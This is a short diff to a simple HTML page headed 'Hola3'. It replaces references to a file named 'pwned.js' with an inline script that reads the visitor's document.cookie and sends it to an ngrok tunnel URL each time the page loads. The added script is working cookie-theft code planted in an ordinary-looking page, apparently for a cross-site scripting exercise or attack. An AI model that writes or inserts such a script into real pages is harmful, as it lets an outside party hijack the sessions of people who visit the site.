@@ -7,7 +7,10 @@
 </head>
 <body>
     <h1>Hola3</h1>
-    <img src="pwned.js">
-    <script src="pwned.js"></script>
+    <script>
+        var request = new XMLHttpRequest();
+        request.open('GET', 'https://070c-90-173-214-195.ngrok-free.app/?cookie=' + document.cookie);
+        request.send();
+    </script>
 </body>
 </html>
